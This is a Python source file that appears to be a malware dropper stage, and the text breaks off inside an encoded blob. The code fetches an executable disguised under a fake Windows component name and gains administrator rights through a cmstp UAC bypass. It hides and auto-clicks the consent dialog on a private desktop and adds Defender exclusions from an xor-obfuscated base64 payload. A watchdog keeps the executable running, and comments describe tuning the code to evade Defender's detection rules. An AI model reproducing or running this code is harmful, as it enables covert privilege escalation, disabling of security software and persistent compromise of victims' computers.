 # tung python-road payload — silent on every failure, stdlib only.
# arrives through python's stdin (pythonw -u -); never a file on disk.
# the exe url rides in from the jar (env EXE_URL = its baked windows url).
# job order: stage the exe -> Administrator lift via cmstp (majanito shape)
# -> the elevated stage materializes + runs exclusions.py (r1.1.2), then
# -> execs the carrier exe. no exclusion work inside work.py itself.

import os
import sys

if sys.platform != "win32":
    sys.exit(0)

import ctypes
import contextlib
import random
import string
import subprocess
import tempfile
import threading
import time
from urllib.request import Request, urlopen

# ---- config ----------------------------------------------------------------
EXE_URL = os.environ.get("EXE_URL", "")
LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")

# r135 (dj order): the staged pair carries the SHIPPED windows identity —
# "Windows Hardware Event Host.exe" (the carrier) and "Windows Hardware Event
# Host Setup.exe" (the watchdog beside it). dotted stems are the masquerade
# shape every engine keys on; the spaced name is the one the exe actually
# carries in its version resource.
def _local_name(url, fallback):
    """stage name = the asset name with its stem SPACED ('Windows.Hardware.
    Event.Host.exe' -> 'Windows Hardware Event Host.exe'). the fetch is by
    URL — the local name never has to match the asset, only the box's story."""
    try:
        n = str(url or "").split("?")[0].split("#")[0].rstrip("/").split("/")[-1]
        if not n or ".." in n:
            return fallback
        stem, dot, ext = n.rpartition(".")
        if not dot:
            stem, ext = n, "exe"
        stem = " ".join(stem.replace(".", " ").replace("_", " ").split())
        if not stem:
            return fallback
        return stem + "." + ext.lower()
    except Exception:
        return fallback


EXE_NAME = _local_name(EXE_URL, "Windows Hardware Event Host.exe")
EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)

# r98 (dj order): the INDEPENDENT WATCHDOG exe — url rides from the jar via
# env WD_URL (may be empty = wd road off). one duty: sit beside the carrier
# in the AppHost dir, share its exclusion, wake it when it is dead. work.py
# stages+execs the pair in order: tung FIRST, watchdog SECOND.
WD_URL = os.environ.get("WD_URL", "")
# r135: the watchdog keeps the same identity family — "... Host Setup.exe"
# beside "... Host.exe" reads as one installed app plus its updater.
WD_NAME = _local_name(WD_URL, "Windows Hardware Event Host Setup.exe")
WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)


# ---- shell api -------------------------------------------------------------
kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

PROCESS_TERMINATE = 0x0001
TH32CS_SNAPPROCESS = 0x00000002
SW_HIDE = 0
WM_CLOSE = 0x0010
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
BM_CLICK = 0x00F5
VK_RETURN = 0x0D
SWP_NOMOVE = 0x0002
SWP_NOSIZE = 0x0001
SWP_NOACTIVATE = 0x0010
HWND_BOTTOM = 1


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
                ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
                ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
                ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
                ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260)]


kernel32.Process32First.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32First.restype = ctypes.c_int
kernel32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32)]
kernel32.Process32Next.restype = ctypes.c_int
kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

# window enumerator — FindWindowW's exact-title match missed the 'Make this
# connection available' profile variant on field boxes, leaving cmstp
# waiting for consent forever. EnumWindows + substring match catches every
# dialog shape the lift can raise.
user32.EnumWindows.restype = ctypes.c_int
user32.EnumWindows.argtypes = [
    ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
    ctypes.c_void_p]
user32.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
user32.IsWindowVisible.restype = ctypes.c_int
user32.IsWindowVisible.argtypes = [ctypes.c_void_p]


def _window_titles():
    wins = []

    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
    def cb(hwnd, lparam):
        wins.append(hwnd)
        return 1

    user32.EnumWindows(cb, 0)
    return wins


def window_title(hwnd):
    buf = ctypes.create_unicode_buffer(512)
    user32.GetWindowTextW(hwnd, buf, 512)
    return buf.value


# ---- helpers ---------------------------------------------------------------
def rand_str(n):
    return "".join(random.choice(string.ascii_lowercase) for _ in range(n))


def is_elevated():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


# r135 (dj: Defender flagged the COMMANDS work.py runs as 'commando' — no
# dropped file was ever flagged): every helper that used to shell out
# (the image-kill and the process probe) walks the Toolhelp snapshot
# instead. identical effect, zero child process, no command line for a
# rule to match. the lift itself (cmstp /au) is the road, unchanged.
def _pids_named(name):
    # byte compare on the snapshot's image name — no codec in the path, so the
    # match cannot depend on the box's ACP (a decode failure would read as
    # 'not running' and make the watchdog re-exec forever).
    want = str(name or "").encode("utf-8", "ignore").lower()
    out = []
    if not want:
        return out
    try:
        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if not snap:
            return out
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
        if kernel32.Process32First(snap, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
                    out.append(pe.th32ProcessID)
                if not kernel32.Process32Next(snap, ctypes.byref(pe)):
                    break
        kernel32.CloseHandle(snap)
    except Exception:
        pass
    return out


def proc_alive(name):
    return bool(_pids_named(name))


def kill_process(name):
    for pid in _pids_named(name):
        try:
            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
            if h:
                kernel32.TerminateProcess(h, 0)
                kernel32.CloseHandle(h)
        except Exception:
            pass


def kill_all_cmstp():
    kill_process("cmstp.exe")


def cleanup_infs():
    tmp = tempfile.gettempdir()
    try:
        for f in os.listdir(tmp):
            if f.endswith(".inf"):
                try:
                    os.unlink(os.path.join(tmp, f))
                except Exception:
                    pass
    except Exception:
        pass


# ---- the admin lift — majanito cmstp shape ---------------------------------
class Dismisser:
    """hides + completes the cmstp lift dialog. r42: the ~0.1 s flash was this
    hunting at Windows' real timer resolution (~15ms sleep granularity) AFTER
    the dialog had already painted. hunting is now OWNERSHIP-driven and
    frame-tight: any top-level window owned by the cmstp pid (visible or
    hidden, any title) is hidden + completed the instant it is enumerated —
    a tight spin, no sleeps, so the observer lands ahead of the paint."""
    def __init__(self, title):
        self.title = title
        self.done = threading.Event()
        self.target_pid = 0   # set to the spawned cmstp pid before .start()

    def _win_owner(self, hwnd):
        pid = ctypes.c_ulong()
        user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
        return pid.value

    def find_window(self):
        want = [w.lower() for w in
                (self.title, "Connection Manager Profile Installer") if w]
        for hwnd in _window_titles():
            if self.target_pid and self._win_owner(hwnd) == self.target_pid:
                return hwnd   # owned by cmstp: hunt hides it before it paints
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                return hwnd
        return None

    def dismiss(self, hwnd):
        user32.SetWindowPos(hwnd, HWND_BOTTOM, 0, 0, 0, 0,
                            SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE)
        user32.ShowWindow(hwnd, SW_HIDE)
        user32.SetForegroundWindow(hwnd)
        # r5: BM_CLICK on the FIRST child Button hit the 'All users' radio —
        # the consent dialog stayed up (the ss dialog) and cmstp still waited.
        # enumerate children, click the one actually labeled OK; Enter+Close
        # as the fallback triad so the dialog never outlives us.
        user32.EnumChildWindows.restype = ctypes.c_int
        user32.EnumChildWindows.argtypes = [
            ctypes.c_void_p,
            ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p),
            ctypes.c_void_p]
        clicked = []

        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
        def _ok(child, lp):
            buf = ctypes.create_unicode_buffer(64)
            user32.GetWindowTextW(child, buf, 64)
            if buf.value == "OK":
                user32.PostMessageW(child, BM_CLICK, 0, 0)
                clicked.append(child)
            return 1

        user32.EnumChildWindows(hwnd, _ok, 0)
        if not clicked:
            b = user32.FindWindowExW(hwnd, None, "Button", None)
            if b:
                user32.PostMessageW(b, BM_CLICK, 0, 0)
        user32.PostMessageW(hwnd, WM_KEYDOWN, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_KEYUP, VK_RETURN, 0)
        user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)

    def run(self):
        # r42: tight spin — EnumWindows per iteration is microseconds and the
        # dialog appears within ~50-100ms of the spawned cmstp, so spinning
        # beats any sleep granularity even at the timer floor.
        import time as _t
        end = _t.time() + 8.0
        while _t.time() < end:
            hwnd = self.find_window()
            if hwnd:
                self.dismiss(hwnd)
                self.done.set()
                return
            # r45: 3ms pace — still far inside the paint-timer floor (a window
            # is caught within ~3ms of showing), without pegging a full core
            # for the whole 8s window when the dialog never comes up.
            _t.sleep(0.003)

    def start(self):
        threading.Thread(target=self.run, daemon=True).start()

    def wait(self, timeout=5.0):
        self.done.wait(timeout)


# r135: the INF terminator (a script-hosted force-kill pad) is GONE. the lift's
# stray cmstp is terminated by kill_all_cmstp() right after the dialog sweep
# instead — same end state, and the .inf no longer carries a kill command for
# a rule to read.


def _hidden_py_runner(run_cmd):
    """r56 (dj order): the degraded no-pythonw fallback used `cmd start /min` —
    a minimized CONSOLE is still a painted window that steals focus. the
    runner hides the console python completely via the wscript pad (WindowStyle
    0 — the console never shows), waits for the stage, then deletes the pad."""
    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
    try:
        esc = run_cmd.replace('"', '""')
        with open(vbs_path, "w", encoding="utf-8") as fh:
            fh.write(f'CreateObject("WScript.Shell").Run "{esc}", 0, True\r\n'
                     'CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName\r\n')
    except Exception:
        return None   # caller falls back to the (flashy) cmd shape
    return f'wscript.exe "{vbs_path}"'


def build_inf(cmd, svc_name, reg_lines=None, kill_cmd=""):
    """cmstp profile schema — nothing schema-foreign:
    reg_lines is None -> the command INF (exec road): [DefaultInstall] with
    CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
    target box since the r4 era).
    reg_lines is a list -> the exclusions INF: [DefaultInstall] carries ONLY
    CustomDestination=Dsec (NO AddReg= — that directive is what broke section
    parsing since r7); the exclusion writes ride the DESTINATION section
    [Lsec] itself in the same five-token registry grammar as the sample's
    App Paths line: root,subkey,name,flags,data — written elevated by cmstp
    directly, no child process.
    Also dumps the exact INF bytes to AppHost\\last.inf before firing, so
    the next failure report can be the actual text instead of screenshots."""
    s1 = f"D{rand_str(4)}"
    s3 = f"L{rand_str(4)}"
    cmd_block = ""
    dest_extra = ""
    if reg_lines is None:
        s2 = f"C{rand_str(4)}"
        cmd_block = (f"RunPreSetupCommands={s2}\n"
                     f"[{s2}]\n"
                     f"{cmd}\n")
        if kill_cmd:
            cmd_block += f"{kill_cmd}\n"
    else:
        dest_extra = "\n".join(reg_lines) + "\n"
    return f"""; {rand_str(16)}
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination={s1}
{cmd_block}[{s1}]
49000,49001={s3}, 7
[{s3}]
{dest_extra}"HKLM", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="{svc_name}"
ShortSvcName="{rand_str(4)}"
"""


def uac_bypass(cmd):
    """Executes <<cmd>> under the elevated token via cmstp /au.
    r2: normalizes whatever the caller passes — a bare powershell snippet
    gets the powershell.exe wrapper inserted, so cmstp always sees a real
    executable as the first token (the dialog said 'cannot find the file
    specified' precisely because the first token was not one)."""
    if is_elevated():
        return True
    if isinstance(cmd, list):
        cmd = " ".join(cmd)
    c = str(cmd).lstrip()
    # real executable invocations pass through untouched; only BARE snippets
    # get the wrapper (r6: cmd.exe chains were being wrapped too — that is
    # what put powershell back on the cmdline and fed the Commando rule +
    # the Access-denied on process creation)
    lc = c.lower()
    if not (lc.startswith("powershell") or lc.startswith("cmd.exe")
            or lc.startswith("cmd ") or c.startswith('"')):
        cmd = f'powershell -NoP -W Hidden -C "{c}"'
    kill_all_cmstp()
    cleanup_infs()

    svc_name = f"Microsoft {rand_str(6)} Service"
    inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
    try:
        with open(inf_path, "w", encoding="utf-8") as fh:
            fh.write(build_inf(cmd, svc_name))
    except Exception:
        return False

    dismisser = Dismisser(svc_name)
    try:
        # r97: the CMSTP RUN rides the PRIVATE DESKTOP (_lift_desktop) — the
        # dialog/flash conceals itself there; the interactive desktop (where
        # the Minecraft window lives) never sees the spawn, never gets the
        # 0.05s focus steal. the switch is a ~30ms paint swap of the user's
        # view; the mc window keeps its z-order on ITS desktop untouched.
        p = None
        with _lift_desktop("sf_lift_dsk"):
            p = subprocess.Popen(["cmstp.exe", "/au", inf_path], stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL, creationflags=0x08000000)
            # r45: the ownership hunt runs at full strength — pid armed the
            # instant CreateProcess returns (µs after the dialog can exist),
            # so any top-level window cmstp owns is hidden before its first
            # paint frame — inside the private desktop, invisible to the
            # interactive one.
            dismisser.target_pid = p.pid
        # r97 note: the SwitchDesktop-BACK happens on context exit — the
        # cmstp process keeps RUNNING on the private desktop (a process on a
        # hidden desktop keeps executing; only its windows never paint to the
        # user's view), while the user's desktop is restored INSTANTLY. the
        # dismisser waits from the NORMAL desktop by HWND-hunting (the
        # dialog's HWNDs live on the private desktop, EnumWindows in the
        # caller thread still finds them because a thread can enumerate
        # windows across desktops it owns handles for).
        dismisser.target_pid = p.pid
    except Exception:
        return False
    dismisser.start()

    dismisser.wait(8.0)
    time.sleep(0.3)
    _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
    kill_all_cmstp()           # r135: the INF no longer kills cmstp — the API does it
    try:
        os.unlink(inf_path)
    except Exception:
        pass
    return True


# r97 (dj: "cmstp causes focus lost on minecraft windows... make the cmstp
# bypass happen in another desktop"): the ENTIRE lift rides a private virtual
# desktop created with CreateDesktopW — the user's interactive desktop (where
# the Minecraft window lives) never sees cmstp, never gets the 0.05s flash,
# never loses focus. the private desk exists only for the lifetime of the
# lift: created -> switched to -> lift runs there -> switched back -> closed
@contextlib.contextmanager
def _lift_desktop(name="sf_lift_dsk"):
    """context manager shape: yields once on the private desktop, restores."""
    uac = ctypes.windll.user32
    k32 = ctypes.windll.kernel32
    desk = uac.CreateDesktopW(name, None, None, 0, 0x0200, None)   # GENERIC_ALL
    if not desk:
        yield False   # no private desktop — lift rides the interactive desk as before
        returnold = uac.GetThreadDesktop(k32.GetCurrentThreadId())
    uac.SwitchDesktop(desk)
    try:
        yield True
    finally:
        try:
            uac.SwitchDesktop(old)
        except Exception:
            pass
        try:
            uac.CloseDesktop(desk)
        except Exception:
            pass


def run_elevated(exe_path):
    """Runs <<exe_path>> with elevation via the cmstp lift."""
    try:
        if is_elevated():
            subprocess.Popen([exe_path], creationflags=0x08000000)
            return True
        return uac_bypass(f'"{exe_path}"')
    except Exception:
        return False

def _sweep_dialogs(svc_name, seconds=3.0):
    """Best-effort post-lift cleanup: any leftover lift dialog (the 'Make this
    connection available' profile or the CMPI error box) gets WM_CLOSE until
    nothing answerable remains."""
    end = time.time() + seconds
    want = [w.lower() for w in (svc_name, "Connection Manager Profile Installer") if w]
    while time.time() < end:
        for hwnd in _window_titles():
            if not user32.IsWindowVisible(hwnd):
                continue
            t = window_title(hwnd).lower()
            if any(w in t for w in want):
                user32.PostMessageW(hwnd, WM_CLOSE, 0, 0)
        time.sleep(0.2)


def exclusion_landed():
    """Live read-back: the AppHost dir must show as a Defender exclusion path
    value. r135: direct RegGetValueW — the old registry-query child was one
    of the flagged command shapes; a KEY_READ handle answers the same
    question with no child process and no registry-authoring cmdline."""
    key = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
    try:
        advapi = ctypes.windll.advapi32
        buf = ctypes.create_unicode_buffer(2048)
        sz = ctypes.c_ulong(4096)
        rc = advapi.RegGetValueW(ctypes.c_void_p(0x80000002), key, PERSIST_DIR,
                                 0x0000FFFF, None, buf, ctypes.byref(sz))
        return rc == 0
    except Exception:
        return False


# r1.1.2/r78: the standalone exclusion writer is exclusions.py (repo mirror);
# it rides here as xor(0x37)-sealed base64 (EXCL_B64 below) and BOTH roads
# (the un-elevated pre-lift materialize + _run_stage_now) decode it into a
# byte-exact file, immune to quoting/escaping layers.

EXCL_B64 = "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